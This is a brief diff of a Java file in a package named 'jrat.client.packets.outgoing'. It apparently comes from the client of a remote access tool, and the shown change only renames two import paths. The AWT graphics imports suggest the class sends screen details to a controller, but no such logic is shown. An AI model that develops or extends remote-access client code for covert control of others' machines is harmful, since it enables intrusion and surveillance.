@@ -1,7 +1,7 @@
 package jrat.client.packets.outgoing;
 
-import io.jrat.common.io.StringWriter;
-import io.jrat.common.utils.Utils;
+import jrat.common.io.StringWriter;
+import jrat.common.utils.Utils;
 import java.awt.GraphicsDevice;
 import java.awt.GraphicsEnvironment;
 import java.awt.Rectangle;
